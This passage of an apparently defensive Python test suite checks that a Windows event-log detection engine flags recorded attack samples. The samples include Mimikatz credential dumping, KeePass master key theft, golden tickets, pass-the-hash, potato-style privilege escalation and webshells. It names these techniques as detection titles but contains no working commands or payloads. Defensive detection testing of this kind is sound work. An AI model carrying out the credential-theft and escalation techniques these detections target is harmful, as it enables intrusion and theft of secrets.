        self.assertIn("TrustedForDelegation", finding.get("evidence", {}).get("delegation_change", ""))

    @unittest.skipUnless(WMI_VSS_DELETE_SAMPLE.is_file(), "WMI VSS delete EVTX sample not available")
    def test_attack_sample_wmi_vss_delete_generates_finding(self):
        findings = self._run_dataset(WMI_VSS_DELETE_SAMPLE, "test-attack-sample-wmi-vss-delete")
        title = "Suspicious: Shadow " + "Copy Deletion"
        finding = next((item for item in findings["findings"] if item.get("title") == title), None)
        self.assertIsNotNone(finding)

    @unittest.skipUnless(POWERSHELL_VSS_DELETE_SAMPLE.is_file(), "PowerShell VSS delete EVTX sample not available")
    def test_attack_sample_powershell_vss_delete_generates_finding(self):
        findings = self._run_dataset(POWERSHELL_VSS_DELETE_SAMPLE, "test-attack-sample-powershell-vss-delete")
        title = "Suspicious: Shadow " + "Copy Deletion"
        finding = next((item for item in findings["findings"] if item.get("title") == title), None)
        self.assertIsNotNone(finding)

    @unittest.skipUnless(HOSTS_FILE_MODIFIED_SAMPLE.is_file(), "hosts file modification EVTX sample not available")
    def test_attack_sample_hosts_file_modified_generates_finding(self):
        findings = self._run_dataset(HOSTS_FILE_MODIFIED_SAMPLE, "test-attack-sample-hosts-file-modified")
        finding = next((item for item in findings["findings"] if item.get("title") == "Hosts File Modified"), None)
        self.assertIsNotNone(finding)

    @unittest.skipUnless(MITRE_GPO_SAMPLE.is_file(), "sensitive GPO EVTX sample not available")
    def test_attack_sample_sensitive_gpo_generates_finding_and_incident(self):
        findings = self._run_dataset(MITRE_GPO_SAMPLE, "test-attack-sample-sensitive-gpo")
        finding = next((item for item in findings["findings"] if item.get("title") == "Group Policy Object Modified"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "policy_modification"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(MITRE_PASSWORD_RESET_SAMPLE.is_file(), "password reset EVTX sample not available")
    def test_attack_sample_remote_password_reset_generates_finding_and_incident(self):
        findings = self._run_dataset(MITRE_PASSWORD_RESET_SAMPLE, "test-attack-sample-remote-password-reset")
        finding = next((item for item in findings["findings"] if item.get("title") == "Remote SAMR Password Reset"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "remote_password_reset"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(PASSWORD_CHANGE_NTLM_SAMPLE.is_file(), "cross-account password change EVTX sample not available")
    def test_attack_sample_cross_account_password_change_generates_finding_and_incident(self):
        findings = self._run_dataset(PASSWORD_CHANGE_NTLM_SAMPLE, "test-attack-sample-cross-account-password-change")
        finding = next((item for item in findings["findings"] if item.get("title") == "Cross-Account Password Change"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "cross_account_password_change"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(PASSWORD_NOT_REQUIRED_SAMPLE.is_file(), "password-not-required EVTX sample not available")
    def test_attack_sample_password_not_required_generates_finding_and_incident(self):
        findings = self._run_dataset(PASSWORD_NOT_REQUIRED_SAMPLE, "test-attack-sample-password-not-required")
        finding = next((item for item in findings["findings"] if item.get("title") == "Password Not Required Enabled"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "password_not_required_enabled"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(PASSWORD_NEVER_EXPIRES_SAMPLE.is_file(), "password-never-expires EVTX sample not available")
    def test_attack_sample_password_never_expires_generates_finding_and_incident(self):
        findings = self._run_dataset(PASSWORD_NEVER_EXPIRES_SAMPLE, "test-attack-sample-password-never-expires")
        finding = next((item for item in findings["findings"] if item.get("title") == "Password Never Expires Enabled"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "password_never_expires_enabled"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(ACCOUNT_NOT_DELEGATABLE_SAMPLE.is_file(), "account-not-delegatable EVTX sample not available")
    def test_attack_sample_account_not_delegatable_generates_finding_and_incident(self):
        findings = self._run_dataset(ACCOUNT_NOT_DELEGATABLE_SAMPLE, "test-attack-sample-account-not-delegatable")
        finding = next((item for item in findings["findings"] if item.get("title") == "Sensitive and Not Delegatable Enabled"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "account_not_delegatable_enabled"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(PREAUTH_DISABLED_SAMPLE.is_file(), "preauth-disabled EVTX sample not available")
    def test_attack_sample_preauth_disabled_generates_finding_and_incident(self):
        findings = self._run_dataset(PREAUTH_DISABLED_SAMPLE, "test-attack-sample-preauth-disabled")
        finding = next((item for item in findings["findings"] if item.get("title") == "Kerberos Preauthentication Disabled"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "kerberos_preauth_disabled"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(DES_ONLY_SAMPLE.is_file(), "des-only EVTX sample not available")
    def test_attack_sample_des_only_generates_finding_and_incident(self):
        findings = self._run_dataset(DES_ONLY_SAMPLE, "test-attack-sample-des-only")
        finding = next((item for item in findings["findings"] if item.get("title") == "Kerberos DES-Only Encryption Enabled"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "kerberos_des_only_enabled"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(REVERSIBLE_PASSWORD_SAMPLE.is_file(), "reversible-password EVTX sample not available")
    def test_attack_sample_reversible_password_generates_finding_and_incident(self):
        findings = self._run_dataset(REVERSIBLE_PASSWORD_SAMPLE, "test-attack-sample-reversible-password")
        finding = next((item for item in findings["findings"] if item.get("title") == "Reversible Password Encryption Enabled"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "reversible_password_encryption_enabled"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(USER_RENAME_ADMIN_SAMPLE.is_file(), "admin-like rename EVTX sample not available")
    def test_attack_sample_user_rename_admin_like_generates_finding_and_incident(self):
        findings = self._run_dataset(USER_RENAME_ADMIN_SAMPLE, "test-attack-sample-user-rename-admin-like")
        finding = next((item for item in findings["findings"] if item.get("title") == "User Renamed to Admin-Like Name"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "user_renamed_admin_like"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(COMPUTER_RENAME_NO_DOLLAR_SAMPLE.is_file(), "computer rename EVTX sample not available")
    def test_attack_sample_computer_rename_without_dollar_generates_finding_and_incident(self):
        findings = self._run_dataset(COMPUTER_RENAME_NO_DOLLAR_SAMPLE, "test-attack-sample-computer-rename-no-dollar")
        finding = next((item for item in findings["findings"] if item.get("title") == "Computer Account Renamed Without Trailing Dollar"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "computer_account_rename_without_trailing_dollar"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(SAMACCOUNT_SPOOFING_SAMPLE.is_file(), "samaccount spoofing EVTX sample not available")
    def test_attack_sample_samaccount_spoofing_generates_specific_incident_without_generic_duplicate(self):
        findings = self._run_dataset(SAMACCOUNT_SPOOFING_SAMPLE, "test-attack-sample-samaccount-spoofing")
        titles = {item.get("title") for item in findings["findings"]}
        incident_types = {item.get("incident_type") for item in findings["incidents"]}

        self.assertIn("Computer Account Spoofing Kerberos Abuse", titles)
        self.assertIn("computer_account_spoofing_kerberos_abuse", incident_types)
        self.assertNotIn("Computer Account Renamed Without Trailing Dollar", titles)
        self.assertIn("Audit Log Cleared", titles)

    @unittest.skipUnless(SQL_DATABASE_ROLE_SAMPLE.is_file(), "SQL database role EVTX sample not available")
    def test_attack_sample_sql_database_role_generates_finding_and_incident(self):
        findings = self._run_dataset(SQL_DATABASE_ROLE_SAMPLE, "test-attack-sample-sql-database-role")
        finding = next((item for item in findings["findings"] if item.get("title") == "SQL Database Role Membership Added"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "sql_database_role_membership_added"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(SQL_SERVER_ROLE_SAMPLE.is_file(), "SQL server role EVTX sample not available")
    def test_attack_sample_sql_server_role_generates_finding_and_incident(self):
        findings = self._run_dataset(SQL_SERVER_ROLE_SAMPLE, "test-attack-sample-sql-server-role")
        finding = next((item for item in findings["findings"] if item.get("title") == "SQL Server Role Membership Added"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "sql_server_role_membership_added"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(SQL_USER_LINK_SAMPLE.is_file(), "SQL user link EVTX sample not available")
    def test_attack_sample_sql_user_link_generates_finding_and_incident(self):
        findings = self._run_dataset(SQL_USER_LINK_SAMPLE, "test-attack-sample-sql-user-link")
        finding = next((item for item in findings["findings"] if item.get("title") == "SQL User Linked to Login"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "sql_user_linked_to_login"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(MASS_GROUP_CHANGE_SAMPLE.is_file(), "mass group change EVTX sample not available")
    def test_attack_sample_mass_group_membership_change_generates_finding_and_incident(self):
        findings = self._run_dataset(MASS_GROUP_CHANGE_SAMPLE, "test-attack-sample-mass-group-membership-change")
        finding = next((item for item in findings["findings"] if item.get("title") == "Mass Group Membership Change"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "mass_group_membership_change"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(SELF_ADD_GROUP_SAMPLE.is_file(), "self-add group EVTX sample not available")
    def test_attack_sample_self_add_group_generates_finding_and_incident(self):
        findings = self._run_dataset(SELF_ADD_GROUP_SAMPLE, "test-attack-sample-self-add-group")
        finding = next((item for item in findings["findings"] if item.get("title") == "Self-Added to Group"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "self_added_to_group"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(EXCHANGE_ADMIN_GROUP_SAMPLE.is_file(), "Exchange admin EVTX sample not available")
    def test_attack_sample_exchange_admin_group_change_generates_finding_and_incident(self):
        findings = self._run_dataset(EXCHANGE_ADMIN_GROUP_SAMPLE, "test-attack-sample-exchange-admin-group-change")
        finding = next((item for item in findings["findings"] if item.get("title") == "Mass Group Membership Change"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "mass_group_membership_change"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(PASSWORD_CANNOT_CHANGE_SAMPLE.is_file(), "password-cannot-change EVTX sample not available")
    def test_attack_sample_password_cannot_change_remains_quiet_without_changed_attribute_evidence(self):
        findings = self._run_dataset(PASSWORD_CANNOT_CHANGE_SAMPLE, "test-attack-sample-password-cannot-change")
        self.assertEqual(findings["summary"]["signal_count"], 0)
        self.assertEqual(findings["summary"]["finding_count"], 0)
        self.assertEqual(findings["summary"]["incident_count"], 0)

    @unittest.skipUnless(MITRE_GOLDEN_TICKET_SAMPLE.is_file(), "golden ticket EVTX sample not available")
    def test_attack_sample_golden_ticket_generates_finding_and_incident(self):
        findings = self._run_dataset(MITRE_GOLDEN_TICKET_SAMPLE, "test-attack-sample-golden-ticket")
        finding = next((item for item in findings["findings"] if item.get("title") == "Golden Ticket Use Pattern"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "golden_ticket_use"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(MITRE_ADMINSDHOLDER_PERM_SAMPLE.is_file(), "AdminSDHolder permissions EVTX sample not available")
    def test_attack_sample_adminsdholder_permissions_generates_finding_and_incident(self):
        findings = self._run_dataset(MITRE_ADMINSDHOLDER_PERM_SAMPLE, "test-attack-sample-adminsdholder-permissions")
        finding = next((item for item in findings["findings"] if item.get("title") == "AdminSDHolder Permissions Changed"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "adminsdholder_backdoor"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(MITRE_ADMINSDHOLDER_OBF_SAMPLE.is_file(), "AdminSDHolder obfuscation EVTX sample not available")
    def test_attack_sample_adminsdholder_obfuscation_generates_finding_and_incident(self):
        findings = self._run_dataset(MITRE_ADMINSDHOLDER_OBF_SAMPLE, "test-attack-sample-adminsdholder-obfuscation")
        finding = next((item for item in findings["findings"] if item.get("title") == "AdminSDHolder Rights Obfuscation"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "adminsdholder_rights_obfuscation"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(MITRE_SPN_USER_SAMPLE.is_file(), "SPN user EVTX sample not available")
    def test_attack_sample_spn_user_generates_finding_and_incident(self):
        findings = self._run_dataset(MITRE_SPN_USER_SAMPLE, "test-attack-sample-spn-user")
        finding = next((item for item in findings["findings"] if item.get("title") == "SPN Added to User Account"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "spn_assignment"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(MITRE_SPN_COMPUTER_SAMPLE.is_file(), "SPN computer EVTX sample not available")
    def test_attack_sample_spn_computer_generates_finding_and_incident(self):
        findings = self._run_dataset(MITRE_SPN_COMPUTER_SAMPLE, "test-attack-sample-spn-computer")
        finding = next((item for item in findings["findings"] if item.get("title") == "SPN Added to Computer Account"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "spn_assignment"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(SPN_PROCESS_SAMPLE.is_file(), "process-backed SPN EVTX sample not available")
    def test_attack_sample_process_spn_generates_finding_and_incident(self):
        findings = self._run_dataset(SPN_PROCESS_SAMPLE, "test-attack-sample-process-spn")
        finding = next((item for item in findings["findings"] if item.get("title") == "SPN Added to User Account"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "spn_assignment"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual(finding.get("user"), r"offsec\honey-pot1")

    @unittest.skipUnless(MITRE_AD_OBJECT_OWNER_SAMPLE.is_file(), "AD object owner EVTX sample not available")
    def test_attack_sample_ad_object_owner_change_generates_finding_and_incident(self):
        findings = self._run_dataset(MITRE_AD_OBJECT_OWNER_SAMPLE, "test-attack-sample-ad-object-owner")
        finding = next((item for item in findings["findings"] if item.get("title") == "AD Object Owner Changed"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "ad_object_owner_change"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(MITRE_ADCS_OCSP_SAMPLE.is_file(), "AD CS OCSP EVTX sample not available")
    def test_attack_sample_adcs_ocsp_tampering_generates_finding_and_incident(self):
        findings = self._run_dataset(MITRE_ADCS_OCSP_SAMPLE, "test-attack-sample-adcs-ocsp")
        finding = next((item for item in findings["findings"] if item.get("title") == "AD CS OCSP Configuration Tampering"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "adcs_ocsp_tampering"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(WINRM_SAMPLE.is_file(), "WinRM EVTX sample not available")
    def test_attack_sample_winrm_generates_finding(self):
        findings = self._run_dataset(WINRM_SAMPLE, "test-attack-sample-winrm")
        finding = next((item for item in findings["findings"] if item.get("title") == "WinRM Remote Execution"), None)
        self.assertIsNotNone(finding)

    @unittest.skipUnless(DEEPBLUE_EVENTLOG_SAMPLE.is_file(), "DeepBlue eventlog tampering sample not available")
    def test_deepblue_eventlog_tampering_generates_finding(self):
        findings = self._run_dataset(DEEPBLUE_EVENTLOG_SAMPLE, "test-deepblue-eventlog-tampering")
        finding = next((item for item in findings["findings"] if item.get("title") == "Windows Event Log Service Disabled"), None)
        self.assertIsNotNone(finding)

    @unittest.skipUnless(DEEPBLUE_MIMIKATZ_SAMPLE.is_file(), "DeepBlue mimikatz sample not available")
    def test_deepblue_mimikatz_generates_specific_finding(self):
        findings = self._run_dataset(DEEPBLUE_MIMIKATZ_SAMPLE, "test-deepblue-mimikatz")
        finding = next((item for item in findings["findings"] if item.get("title") == "Mimikatz Credential Dumping"), None)
        self.assertIsNotNone(finding)

    @unittest.skipUnless(DEEPBLUE_PASSWORD_SPRAY_SAMPLE.is_file(), "DeepBlue password spray sample not available")
    def test_deepblue_password_spray_generates_grouped_finding(self):
        findings = self._run_dataset(DEEPBLUE_PASSWORD_SPRAY_SAMPLE, "test-deepblue-password-spray")
        spray = next((item for item in findings["findings"] if item.get("title") == "Password Spray Attack"), None)
        explicit = [item for item in findings["findings"] if item.get("title") == "Explicit Credential Use"]
        self.assertIsNotNone(spray)
        self.assertEqual(len(explicit), 0)

    @unittest.skipUnless(DEEPBLUE_WMI_PERSIST_SAMPLE.is_file(), "DeepBlue WMI persistence sample not available")
    def test_deepblue_wmi_activity_persistence_generates_finding(self):
        findings = self._run_dataset(DEEPBLUE_WMI_PERSIST_SAMPLE, "test-deepblue-wmi-persist")
        matching = [item for item in findings["findings"] if item.get("title") == "WMI Event Subscription Persistence"]
        self.assertGreaterEqual(len(matching), 1)
        self.assertLessEqual(len(matching), 5)
        self.assertGreaterEqual(matching[0].get("evidence", {}).get("collapsed_event_count", 0), 1)

    @unittest.skipUnless(DEEPBLUE_PSATTACK_SAMPLE.is_file(), "DeepBlue PSAttack sample not available")
    def test_deepblue_psattack_generates_finding(self):
        findings = self._run_dataset(DEEPBLUE_PSATTACK_SAMPLE, "test-deepblue-psattack")
        finding = next((item for item in findings["findings"] if item.get("title") == "Suspicious .NET Compilation from User Temp"), None)
        self.assertIsNotNone(finding)

    @unittest.skipUnless(DEEPBLUE_OBF_PS_SAMPLE.is_file(), "DeepBlue obfuscated PowerShell sample not available")
    def test_deepblue_obfuscated_powershell_completes_and_detects(self):
        findings = self._run_dataset(DEEPBLUE_OBF_PS_SAMPLE, "test-deepblue-obf-ps")
        matching = [item for item in findings["findings"] if item.get("title") in {"PowerShell Encoded Payload", "PowerShell Obfuscated Script"}]
        self.assertGreaterEqual(len(matching), 1)

    @unittest.skipUnless(HAYABUSA_OBF_PS_SAMPLE.is_file(), "Hayabusa obfuscated PowerShell sample not available")
    def test_hayabusa_obfuscated_powershell_completes_and_detects(self):
        findings = self._run_dataset(HAYABUSA_OBF_PS_SAMPLE, "test-hayabusa-obf-ps")
        matching = [item for item in findings["findings"] if item.get("title") in {"PowerShell Encoded Payload", "PowerShell Obfuscated Script"}]
        self.assertGreaterEqual(len(matching), 1)

    @unittest.skipUnless(PSEXEC_POWERSHELL_SECURITY_SAMPLE.is_file(), "PsExec PowerShell security EVTX sample not available")
    def test_psexec_powershell_security_sample_completes_end_to_end(self):
        findings = self._run_dataset(PSEXEC_POWERSHELL_SECURITY_SAMPLE, "test-psexec-powershell-security")
        self.assertGreater(findings["summary"]["signal_count"], 0)

    @unittest.skipUnless(HIDDEN_LOCAL_ACCOUNT_SAMPLE.is_file(), "hidden local account EVTX sample not available")
    def test_attack_sample_hidden_local_account_generates_signal(self):
        findings = self._run_dataset(HIDDEN_LOCAL_ACCOUNT_SAMPLE, "test-attack-sample-hidden-local-account")
        signal = next((item for item in findings["signals"] if item.get("source_rule") == "Hidden Local Account Registry Entry"), None)
        self.assertIsNotNone(signal)

    @unittest.skipUnless(ATOMIC_HIDDEN_USER_DOLLAR_SAMPLE.is_file(), "Atomic hidden-user dollar EVTX sample not available")
    def test_atomic_hidden_user_dollar_generates_fake_account_finding(self):
        findings = self._run_dataset(ATOMIC_HIDDEN_USER_DOLLAR_SAMPLE, "test-atomic-hidden-user-dollar")
        fake = next((item for item in findings["findings"] if item.get("title") == "Fake Computer Account Created"), None)
        self.assertIsNotNone(fake)
        self.assertEqual(fake["target_user_display"], "$")
        self.assertEqual(fake["evidence"].get("detection_source"), "process_command")

    @unittest.skipUnless(ATOMIC_HIDDEN_USER_REGISTRY_SAMPLE.is_file(), "Atomic hidden-user registry EVTX sample not available")
    def test_atomic_hidden_user_registry_generates_hidden_account_incident(self):
        findings = self._run_dataset(ATOMIC_HIDDEN_USER_REGISTRY_SAMPLE, "test-atomic-hidden-user-registry")
        fake = next((item for item in findings["findings"] if item.get("title") == "Fake Computer Account Created"), None)
        hidden = next((item for item in findings["findings"] if item.get("title") == "Hidden User Registry Value"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "hidden_local_account_persistence"), None)
        self.assertIsNotNone(fake)
        self.assertIsNotNone(hidden)
        self.assertIsNotNone(incident)
        self.assertEqual(incident["user_display"], "AtomicOperator$")
        self.assertEqual(hidden["evidence"].get("detection_source"), "process_command")

    @unittest.skipUnless(Path(ROOT / "sample_cache" / "evtx_fake_computer_4720.evtx").is_file(), "fake computer account EVTX sample not available")
    def test_attack_sample_fake_computer_account_generates_finding(self):
        findings = self._run_dataset(ROOT / "sample_cache" / "evtx_fake_computer_4720.evtx", "test-attack-sample-fake-computer-a")
        matching = [item for item in findings["findings"] if item.get("title") == "Fake Computer Account Created"]
        self.assertEqual(len(matching), 1)
        self.assertGreaterEqual(matching[0]["evidence"].get("collapsed_event_count", 0), 2)

    @unittest.skipUnless(Path(ROOT / "sample_cache" / "mitre_fake_computer_created.evtx").is_file(), "fake computer created EVTX sample not available")
    def test_attack_sample_fake_computer_named_account_generates_finding(self):
        findings = self._run_dataset(ROOT / "sample_cache" / "mitre_fake_computer_created.evtx", "test-attack-sample-fake-computer-b")
        matching = [item for item in findings["findings"] if item.get("title") == "Fake Computer Account Created"]
        self.assertEqual(len(matching), 1)

    @unittest.skipUnless(PTH_SAMPLE.is_file(), "pass-the-hash EVTX sample not available")
    def test_attack_sample_pass_the_hash_generates_finding_and_incident(self):
        findings = self._run_dataset(PTH_SAMPLE, "test-attack-sample-pth")
        finding = next((item for item in findings["findings"] if item.get("title") == "Pass-the-Hash Logon"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "pass_the_hash_activity"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual(finding["evidence"].get("logon_process_name"), "seclogo")

    @unittest.skipUnless(LICHTSINNIG_ACCESSIBILITY_SAMPLE.is_file(), "Lichtsinnig accessibility sample not available")
    def test_lichtsinnig_accessibility_generates_finding(self):
        findings = self._run_dataset(LICHTSINNIG_ACCESSIBILITY_SAMPLE, "test-lichtsinnig-accessibility")
        matching = [item for item in findings["findings"] if item.get("title") == "Accessibility Features Backdoor"]
        self.assertEqual(len(matching), 1)

    @unittest.skipUnless(LICHTSINNIG_APPFIX_SAMPLE.is_file(), "Lichtsinnig appfix sample not available")
    def test_lichtsinnig_appfix_generates_finding(self):
        findings = self._run_dataset(LICHTSINNIG_APPFIX_SAMPLE, "test-lichtsinnig-appfix")
        finding = next((item for item in findings["findings"] if item.get("title") == "Application Shim Persistence"), None)
        self.assertIsNotNone(finding)
        chain_findings = [item for item in findings["findings"] if item.get("title") == "Behavioral: Suspicious Process Chain"]
        self.assertLessEqual(len(chain_findings), 1)

    @unittest.skipUnless(LICHTSINNIG_DCSHADOW_SAMPLE.is_file(), "Lichtsinnig DCShadow sample not available")
    def test_lichtsinnig_dcshadow_generates_finding(self):
        findings = self._run_dataset(LICHTSINNIG_DCSHADOW_SAMPLE, "test-lichtsinnig-dcshadow")
        finding = next((item for item in findings["findings"] if item.get("title") == "DCShadow Computer Object Staging"), None)
        self.assertIsNotNone(finding)

    @unittest.skipUnless(LICHTSINNIG_IIS_WEBSHELL_SAMPLE.is_file(), "Lichtsinnig IIS webshell sample not available")
    def test_lichtsinnig_iis_webshell_generates_finding_and_incident(self):
        findings = self._run_dataset(LICHTSINNIG_IIS_WEBSHELL_SAMPLE, "test-lichtsinnig-iis-webshell")
        finding = next((item for item in findings["findings"] if item.get("title") == "IIS Webshell Command Execution"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "iis_webshell_execution"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(LICHTSINNIG_DCOM_IE_SAMPLE.is_file(), "Lichtsinnig DCOM Internet Explorer sample not available")
    def test_lichtsinnig_dcom_ie_generates_finding_and_incident(self):
        findings = self._run_dataset(LICHTSINNIG_DCOM_IE_SAMPLE, "test-lichtsinnig-dcom-ie")
        finding = next((item for item in findings["findings"] if item.get("title") == "DCOM Internet Explorer Execution"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "dcom_internet_explorer_execution"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(LICHTSINNIG_MSIPACKAGE_SAMPLE.is_file(), "Lichtsinnig MSI package sample not available")
    def test_lichtsinnig_msiexec_proxy_generates_finding_and_incident(self):
        findings = self._run_dataset(LICHTSINNIG_MSIPACKAGE_SAMPLE, "test-lichtsinnig-msiexec")
        finding = next((item for item in findings["findings"] if item.get("title") == "Msiexec Package Proxy Execution"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "msiexec_proxy_execution"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)

    @unittest.skipUnless(LICHTSINNIG_KEEPASS_SAMPLE.is_file(), "Lichtsinnig KeePass sample not available")
    def test_lichtsinnig_keepass_generates_finding_and_incident(self):
        findings = self._run_dataset(LICHTSINNIG_KEEPASS_SAMPLE, "test-lichtsinnig-keepass")
        finding = next((item for item in findings["findings"] if item.get("title") == "KeePass Master Key Theft"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "keepass_master_key_theft"), None)
        signal = next((item for item in findings["signals"] if item.get("source_rule") == "Remote Thread Injection"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIsNotNone(signal)
        self.assertNotIn("Remote Thread Injection", {item.get("title") for item in findings["findings"]})

    @unittest.skipUnless(MSSQL_FAILED_LOGON_SAMPLE.is_file(), "MSSQL failed-logon sample not available")
    def test_attack_sample_mssql_failed_logon_generates_finding_and_incident(self):
        findings = self._run_dataset(MSSQL_FAILED_LOGON_SAMPLE, "test-attack-sample-mssql-failed-logon")
        finding = next((item for item in findings["findings"] if item.get("title") == "MSSQL Password Spray"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "mssql_password_spray"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual((finding.get("evidence", {}) or {}).get("source_ip"), "10.0.2.17")
        self.assertIn("sa", (finding.get("evidence", {}) or {}).get("target_accounts", []))

    @unittest.skipUnless(BROWSER_LOGONPROC_CHROME_SAMPLE.is_file(), "Browser logon-process sample not available")
    def test_attack_sample_browser_logon_process_abuse_generates_finding_and_incident(self):
        findings = self._run_dataset(BROWSER_LOGONPROC_CHROME_SAMPLE, "test-attack-sample-browser-logon-process")
        finding = next((item for item in findings["findings"] if item.get("title") == "Browser Logon Process Abuse"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "browser_logon_process_abuse"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual((finding.get("evidence", {}) or {}).get("browser_process"), r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe")
        self.assertEqual((finding.get("evidence", {}) or {}).get("failure_count"), 1)

    @unittest.skipUnless(LICHTSINNIG_ROTTEN_POTATO_SAMPLE.is_file(), "Lichtsinnig Rotten Potato sample not available")
    def test_lichtsinnig_rotten_potato_generates_specific_finding_and_incident(self):
        findings = self._run_dataset(LICHTSINNIG_ROTTEN_POTATO_SAMPLE, "test-lichtsinnig-rotten-potato")
        finding = next((item for item in findings["findings"] if item.get("title") == "Service Account to SYSTEM Impersonation"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "service_account_system_impersonation"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertIn("DefaultAppPool", finding["user_display"])

    @unittest.skipUnless(EFSPOTATO_SAMPLE.is_file(), "EfsPotato sample not available")
    def test_attack_sample_efspotato_generates_specific_finding_and_incident(self):
        findings = self._run_dataset(EFSPOTATO_SAMPLE, "test-attack-sample-efspotato")
        finding = next((item for item in findings["findings"] if item.get("title") == "Potato-Style Named Pipe Impersonation"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "potato_named_pipe_impersonation"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual(finding["process"], r"C:\temp\EfsPotato.exe")

    @unittest.skipUnless(ROGUEPOTATO_SAMPLE.is_file(), "RoguePotato sample not available")
    def test_attack_sample_roguepotato_generates_specific_finding_and_incident(self):
        findings = self._run_dataset(ROGUEPOTATO_SAMPLE, "test-attack-sample-roguepotato")
        finding = next((item for item in findings["findings"] if item.get("title") == "Potato-Style Named Pipe Impersonation"), None)
        incident = next((item for item in findings["incidents"] if item.get("incident_type") == "potato_named_pipe_impersonation"), None)
        self.assertIsNotNone(finding)
        self.assertIsNotNone(incident)
        self.assertEqual((finding.get("evidence", {}) or {}).get("detection_variant"), "rogue_epmapper")

    @unittest.skipUnless(RENAMED_PSEXEC_SERVICE_SAMPLE.is_file(), "renamed PsExec service sample not available")
    def test_attack_sample_renamed_psexec_service_pipes_generates_specific_finding_and_incident(self):
        findings = self._run_dataset(RENAMED_PSEXEC_SERVICE_SAMPLE, "test-attack-sample-renamed-psexec-service")
